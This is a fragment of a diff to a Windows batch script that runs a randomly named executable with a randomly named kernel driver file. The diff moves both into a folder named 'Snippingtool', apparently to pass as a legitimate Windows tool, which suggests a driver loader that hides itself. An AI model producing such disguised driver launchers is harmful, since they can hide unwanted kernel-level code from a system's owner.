@@ -8,12 +8,12 @@ if % errorLevel % neq 0(
 )
 
 :: Set the path to the executable
-set "exePath=C:\Program Files\Common Files\oh9flp.exe"
+set "exePath=C:\Program Files\Snippingtool\oh9flp.exe"
 set "driver1=dg3jiq.sys"
 set "data=.data"
 
 :: Change to the directory where the executable is located
-cd /d "C:\Program Files\Common Files"
+cd /d "C:\Program Files\Snippingtool"
 
 :: Run the command with the specified parameters
 "%exePath%" %driver1% %data%
